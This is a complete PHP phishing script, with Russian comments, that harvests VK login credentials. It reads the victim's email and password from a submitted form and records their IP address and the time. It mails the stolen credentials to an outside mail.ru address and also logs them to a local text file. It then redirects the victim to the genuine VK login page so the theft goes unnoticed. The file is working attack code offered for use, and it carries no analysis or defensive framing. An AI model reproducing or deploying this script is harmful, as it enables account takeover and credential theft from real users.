<?php 

error_reporting(0);

$ip = $_SERVER["REMOTE_ADDR"]; // IP Жертвы
$login = (string)$_POST['email'];
$passwd = (string)$_POST['pass'];
$date = date("d-m-y H:i:s"); // Дата и время

//####################################
$from = "$login@vk.com"; // от кого письмо
$to = "romankrv95@mail.ru"; // кому присылаем данные

$subj = "Пароль от ВК: $login"; // тема письма
$body = "LOGIN:  $login
ПАРОЛЬ:  $passwd 

IP:$ip [$date]
http://login.vk.com/?act=login&email=$login&pass=$passwd"; // тело письма (реконмендую не менять)
//####################################


$from="From: $from\nReply-To: $from\nX-Priority: 1\nContent-Type: text/plain; charset=\"koi8-r\"\nContent-Transfer-Encoding: 8bit"; 
$from=convert_cyr_string($from,"w","k"); 
$to=convert_cyr_string($to,"w","k"); 
$subj=convert_cyr_string($subj,"w","k"); 
$body=convert_cyr_string($body,"w","k"); 
mail($to,$subj,$body,$from); 

$fp = fopen("passed.txt","a+"); //открываем файл
fwrite($fp,"\n [start-- $login:$passwd -- end] \n"); //записываем всё
fclose($fp); //закрываем

//####################################
header("Location: http://vk.com/login.php?&to=&s=1&m=1"); // куда пошлем пользователя после того как он ввел данные!
echo "<META HTTP-EQUIV=\"Refresh\" content =\"0; URL=http://vk.com/login.php?&to=&s=1&m=1\">"

//####################################
?>